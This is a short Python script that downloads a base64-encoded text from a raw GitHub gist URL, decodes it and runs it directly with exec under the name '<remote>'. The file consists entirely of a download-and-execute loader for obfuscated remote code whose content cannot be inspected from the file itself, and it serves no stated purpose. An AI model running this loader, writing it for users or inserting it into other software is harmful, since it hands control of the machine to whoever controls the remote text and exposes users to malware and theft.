import requests, base64

URL = "https://gist.githubusercontent.com/h-anima/01599d8320d36d0690268480246fd70d/raw/430d78eb7ec255cdb484e1dd062f737740b74edb/gistfile1.txt"

response = requests.get(URL)
code_b64 = response.text.strip()

exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))
